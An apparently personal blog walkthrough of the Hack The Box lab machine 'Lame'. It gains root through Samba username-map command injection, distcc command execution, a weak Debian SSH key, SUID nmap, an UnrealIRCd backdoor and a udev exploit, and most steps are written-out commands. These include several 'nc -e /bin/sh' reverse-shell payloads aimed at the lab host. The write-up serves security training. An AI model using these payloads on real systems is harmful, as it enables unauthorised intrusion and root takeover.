---
title:
  "HTB - Lame"
date: 2021-04-25T01:00:27+02:00
cover:
  src: cover.png
draft: false
comments: true
socialShare: true
tags:
  - HTB
  - Lame

aliases:
  - HTB-Lame

---

## Overview

Lame is a beginner-friendly Linux machine and the first box released on Hack The Box (HTB). It leverages the Samba "username map script" vulnerability (CVE-2007-2447) to gain both user and root access. This walkthrough covers the exploitation process with and without Metasploit, along with an analysis of the vulnerabilities.


## Machine Details

- **Author**: [ch4p](https://www.hackthebox.eu/home/users/profile/1)
- **Type**: Linux
- **Difficulty**: 2.7/10


## Reconnaissance

### Nmap Scan

A full TCP and UDP port scan reveals the following open ports:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sT -p- --min-rate 10000 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 00:02 EST
Nmap scan report for 10.10.10.3
Host is up (0.52s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 131.64 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p- --min-rate 10000 10.10.10.3   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:11 EST
Nmap scan report for 10.10.10.3
Host is up (1.3s latency).
Not shown: 65531 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

Nmap done: 1 IP address (1 host up) scanned in 53.81 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,22,139,445,3632 -sC -sV 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:14 EST
Nmap scan report for 10.10.10.3
Host is up (0.64s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h32m09s, deviation: 3h32m12s, median: 2m05s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-03-07T12:16:29-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.94 seconds
```

### Results:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
```

## FTP Enumeration

The FTP service on port 21 allows anonymous logins, which is a common misconfiguration that can sometimes lead to unauthorized access or information disclosure. However, in this case, the directory accessible via anonymous login is empty.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.3    
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33180|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

## Exploiting VSFTPd 2.3.4 Backdoor (CVE-2011-2523)

The VSFTPd version 2.3.4 is infamous for containing a backdoor that allows remote command execution. This backdoor was intentionally inserted into the code and can be exploited under certain conditions. However, in the case of the Lame machine, the backdoor is not remotely exploitable due to firewall restrictions.

```
┌──(kali㉿kali)-[~]                                                                                                 │
└─$ searchsploit vsftpd 2.3.4                                                                                       │
---------------------------------------------------------------------------------- ---------------------------------│
 Exploit Title                                                                    |  Path                           │
---------------------------------------------------------------------------------- ---------------------------------│
vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py            │
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb            │
---------------------------------------------------------------------------------- ---------------------------------│
Shellcodes: No Results
```
The output shows a Metasploit module (`exploits/unix/remote/17491.rb`) that can be used to exploit the backdoor.

### Exploit Details
The backdoor is triggered when a username ending in `:)` is sent during the FTP login process. This causes the server to open a listener on port 6200, which can be used to execute arbitrary commands.

### Manual Exploitation Attempt

1. Trigger the Backdoor:
   Connect to the FTP server and log in with a username ending in `:)`:

```
┌──(kali㉿kali)-[~]                                                                                                 
└─$ nc 10.10.10.3 21                                                                                                
                                                                                                                    
220 (vsFTPd 2.3.4)                                                                                                  
USER n3rdh4x0r:)                                                                                                    
331 Please specify the password.                                                                                    
PASS n3rdh4x0r-not-a-password
```

2. Check for Listener:
   If the backdoor is successfully triggered, the server will open a listener on port 6200. Attempt to connect to it:

```
nc 10.10.10.3 6200
```
  However, in this case, the connection fails:

```
┌──(kali㉿kali)-[~]                                                                                                 
└─$ nc 10.10.10.3 6200

(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
```

### Metasploit Exploitation Attempt

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q
[sudo] password for kali: 
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
The exploit fails because the backdoor listener is blocked by the firewall.

### Why the Exploit Fails
The backdoor listener on port 6200 is not accessible remotely due to firewall rules. This is confirmed by checking the open ports on the machine:

```
root@lame:/# netstat -tnlp | grep 6200
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd

```
While the listener is active, it is not reachable from outside the machine.


## SSH Enumeration

The SSH service running on the target machine provides valuable information about the operating system. By examining the SSH version, we can often determine the exact distribution and version of the OS. Here's how you can use the SSH version to identify the OS:

The SSH service on the target machine is running `OpenSSH 4.7p1 Debian 8ubuntu1`. This version string contains several clues:
* OpenSSH 4.7p1: The version of OpenSSH.
* Debian: Indicates the operating system is based on Debian.
* 8ubuntu1: Suggests the OS is Ubuntu, specifically an older version.

A quick Google search for "OpenSSH 4.7p1 Debian 8ubuntu1" reveals that this version corresponds to Ubuntu 8.04 (Hardy Heron). This is an older version of Ubuntu.

![image](https://github.com/user-attachments/assets/c47a10fe-b11c-4a6f-b2e8-df1d8d8b6c93)

![image](https://github.com/user-attachments/assets/7e5de03e-c952-4da4-ac1c-0e2dc641052c)


## SMB Enumeration

Use `smbmap` to list accessible shares:

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                                      
                                                                                                                             
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connections

```
The `tmp` share is accessible with read and write permissions.

Attempt to connect to the tmp share using `smbclient`:

```
smbclient -N //10.10.10.3/tmp
```
If the connection fails due to protocol negotiation issues, modify the Samba client configuration or use the `--option` flag:

```
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

Output:

```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.3/tmp

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar  7 14:37:13 2025
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  5561.jsvc_up                        R        0  Fri Mar  7 06:37:24 2025
  .ICE-unix                          DH        0  Fri Mar  7 06:36:13 2025
  vmware-root                        DR        0  Fri Mar  7 06:36:09 2025
  .X11-unix                          DH        0  Fri Mar  7 06:36:47 2025
  .X0-lock                           HR       11  Fri Mar  7 06:36:47 2025
  vgauthsvclog.txt.0                  R     1600  Fri Mar  7 06:36:10 2025

                7282168 blocks of size 1024. 5384656 blocks available
smb: \>
```
The tmp share is mapped to the `/tmp` directory and contains no sensitive files.


### Exploitation

Use searchsploit to find exploits for Samba 3.0:

```
┌──(kali㉿kali)-[~]                                                                                                   │
└─$ searchsploit samba 3.0                                                                                            │
------------------------------------------------------------------------------------ ---------------------------------│
 Exploit Title                                                                      |  Path                           │
------------------------------------------------------------------------------------ ---------------------------------│
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                | osx/remote/16875.rb             │
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                              | multiple/remote/10095.txt       │
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb            │
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                  | linux/remote/9950.rb            │
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)              | linux/remote/16859.rb           │
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)            | solaris/remote/16329.rb         │
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                            | linux/dos/4732.c                │
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                   | multiple/dos/5712.pl            │
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                    | linux/remote/364.pl             │
Samba < 3.0.20 - Remote Heap Overflow                                               | linux/remote/7701.txt           │
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                       | linux_x86/dos/36741.py          │
------------------------------------------------------------------------------------ ---------------------------------│
Shellcodes: No Results
```

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | exploits/unix/remote/16320.rb
```
The Samba "username map script" vulnerability (CVE-2007-2447) affects Samba versions 3.0.20 to 3.0.25rc3. This vulnerability allows unauthenticated attackers to execute arbitrary commands by injecting shell metacharacters into the username field during SMB session setup. 

### Manual Exploitation

The vulnerability allows command execution by injecting shell metacharacters into the username field. For example:

```
smbclient -N //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```
However, this may fail due to the shell interpreting the backticks locally. To avoid this, use single quotes:

```
smbclient -N //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh 10.10.14.24 443`'
```
Alternatively, use the `logon` command within an existing `smbclient` session:

```
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```


```
┌──(kali㉿kali)-[~]                                                                                                   
└─$ smbclient -N //10.10.10.3/tmp                                                                                     
                                                                                                                      
Anonymous login successful                                                                                            
Try "help" to get a list of possible commands.                                                                        
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.8 443`"                                                               
Password:                                                                                                             
```

```
┌──(kali㉿kali)-[~]                                                                                                   
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.3] 51083
whoami
root
id
uid=0(root) gid=0(root)
```

### Python Exploit Script

We can use this python script to automate the exploitation process : https://github.com/n3rdh4x0r/CVE-2007-2447.git

```
python3 smb3.0.20.py -lh [localhost] -lp [local port] -t [target]
```

![image](https://github.com/user-attachments/assets/d1a5e6dc-4ae9-4c5f-965a-b94e06305e49)


### Metasploit Exploitation:

Load the Metasploit module for the Samba username map script vulnerability:

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q           
[sudo] password for kali: 
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.16.8:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo cq74vDDUFdos2qKf;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "cq74vDDUFdos2qKf\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.8:4444 -> 10.10.10.3:34648) at 2025-03-07 15:01:15 -0500

whoami
root
id
uid=0(root) gid=0(root)
```

## Post-Exploitation

### Upgrade Shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Retrieve Flags:

User Flag:

```
find /home -name user.txt -exec cat {} \;
```

Root Flag:

```
cat /root/root.txt
```

![image](https://github.com/user-attachments/assets/b7f63d0c-aa53-405c-8684-57112e091830)


## Exploiting DistCC (Port 3632) 

### Background
From the gentoo wiki:

```
Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc. Distcc can work transparently with ccache, Portage, and Automake with a small amount of setup.
```

The idea is networked compilation of code. Also in that same page, in the Configuration section, it recommends configuring which clients are allowed to connect, as:

![image](https://github.com/user-attachments/assets/c33d4e1e-6bee-491e-a041-bb3606519ad1)

### Exploits

`searchsploit` shows an exploit for command execution against the distcc daemon:

```
┌──(kali㉿kali)-[~]
└─$ searchsploit distcc
----------------------------------------------------------------- ---------------------------------
Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit)                   | multiple/remote/9915.rb
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

This vulnerability is less of an exploit and more a consequence of the system design, as outlined in the Gentoo wiki. Essentially, if you can establish a connection to the DistCC service, you can execute arbitrary commands. 

The Metasploit script available for this aligns with `CVE-2004-2687`, which confirms the issue: the service allows remote command execution due to weak configuration and lack of proper authorization checks.

### Manual Exploitation:

The vulnerability allows command execution by sending a specially crafted request to the DistCC service. For example, to execute the `id` command:

```
echo "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV0000000csh -c '(id)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI00000001A" | nc 10.10.10.3 3632
```

![image](https://github.com/user-attachments/assets/d10f95f7-d93f-4aa3-9b16-0c98090838de)

### Using Nmap Script:

An Nmap script (`distcc-exec.nse`) can automate the exploitation process. First, download the script:

```
sudo wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
```
Then, run the script to execute a command:

```
nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 15:34 EST
Nmap scan report for 10.10.10.3
Host is up (0.45s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 3.28 seconds
```

### Gaining a Shell:

To gain a reverse shell, use the Nmap script to execute a `nc` command:

```
nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.16.8 4444'"
```
![image](https://github.com/user-attachments/assets/96309fd4-835e-4e23-b57c-3aeb71080050)


### Privilege Escalation

Once you have a shell as the `daemon` user, you can escalate privileges using one of the following methods:

#### Weak SSH Key:

The `/root` directory is world-readable, allowing access to its contents:

```
daemon@lame:/$ ls -ld root/
drwxr-xr-x 13 root root 4096 Apr  7 10:33 root/
```
While `root.txt` is not readable, the `.ssh` directory is accessible:

```
daemon@lame:/root$ ls -la
total 80
drwxr-xr-x 13 root root 4096 Apr  7 10:33 .
drwxr-xr-x 21 root root 4096 May 20  2012 ..
-rw-------  1 root root  373 Apr  7 10:33 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Apr  7 10:33 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Apr  7 10:33 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Mar 14  2017 root.txt
-rw-r--r--  1 root root  118 Apr  7 10:33 vnc.log
```

Inside the `.ssh` directory, the `authorized_keys` file contains a public SSH key:

```
daemon@lame:/root/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
```

Two observations stand out:

1. The key is associated with the user msfadmin@metasploitable.
2. The key may be vulnerable to CVE-2008-0166, a flaw in OpenSSL's random number generator that made certain SSH keys brute-forceable.

To exploit this, clone the Debian SSH repository and extract the precomputed keys:

```
root@kali:/opt# git clone https://github.com/g0tmi1k/debian-ssh
Cloning into 'debian-ssh'...
remote: Enumerating objects: 35, done.
remote: Total 35 (delta 0), reused 0 (delta 0), pack-reused 35
Unpacking objects: 100% (35/35), 439.59 MiB | 6.72 MiB/s, done.
root@kali:/opt# cd debian-ssh/
root@kali:/opt/debian-ssh# ls
common_keys  our_tools  README.md  uncommon_keys
root@kali:/opt/debian-ssh# cd common_keys/
root@kali:/opt/debian-ssh/common_keys# ls
debian_ssh_dsa_1024_x86.tar.bz2  debian_ssh_rsa_2048_x86.tar.bz2
root@kali:/opt/debian-ssh/common_keys# tar jxf debian_ssh_rsa_2048_x86.tar.bz2
```
Use `grep` to locate the matching private key:


```
root@kali:/opt/debian-ssh/common_keys/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub
57c3115d77c56390332dc5c49978627a-5429.pub
```

Use the matching private key to SSH into the target as root:

```
root@kali:/opt/debian-ssh/common_keys/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
Last login: Tue Apr  7 10:33:18 2020 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
id
root@lame:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The weak SSH key vulnerability (CVE-2008-0166) allowed privilege escalation to root by leveraging a precomputed private key. 


#### SUID Nmap:

The `nmap` binary has the SUID bit set, allowing privilege escalation:

```
nmap --interactive
nmap> !sh
sh-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
```

#### Backdoored UnrealIRCd:

The UnrealIRCd service contains a backdoor that allows command execution:

```
echo "AB; nc -e /bin/sh 10.10.16.8 4444" | nc 127.0.0.1 6697
```
A reverse shell is obtained as root.

![image](https://github.com/user-attachments/assets/bc67c140-83e4-431a-9101-29182c7120c5)


#### CVE 2009–1185: https://www.exploit-db.com/exploits/8572

```
searchsploit -m 8572.c
```
Start up a server on your attack machine.

```
python3 -m http.server 9005
```
In the target machine download the exploit file.

```
wget http://10.10.16.8:9005/8572.c
```
Compile the exploit.

```
gcc 8572.c -o 8572
```

To run it, let’s look at the usage instructions.

![image](https://github.com/user-attachments/assets/dc00ae74-85f8-440a-95f9-f1c13e416aa5)

We need to do two things:

* Figure out the PID of the udevd netlink socket
* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.

To get the PID of the udevd process, run the following command.

```
daemon@lame:/tmp$ ps -aux | grep devd
ps -aux | grep devd
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
root      2741  0.0  0.1   2224   724 ?        S<s  06:35   0:00 /sbin/udevd --daemon
daemon    7475  0.0  0.1   1784   528 pts/4    RN+  16:28   0:00 grep devd
```
Similarly, you can get it through this file as mentioned in the instructions.

```
cat /proc/net/netlink
```
![image](https://github.com/user-attachments/assets/95e25b05-13b1-4508-958e-c82c66569b58)

Next, create a `run` file in `/tmp` and add a reverse shell to it.

```
echo '#!/bin/bash' > run
echo 'nc -nv 10.10.16.8 5555 -e /bin/bash' >> run
```

Set up a listener on your attack machine to receive the reverse shell.

```
nc -nlvp 5555
```
Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

```
./8572 2739
```

We have root!

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.3] 44223
id
uid=0(root) gid=0(root)
```










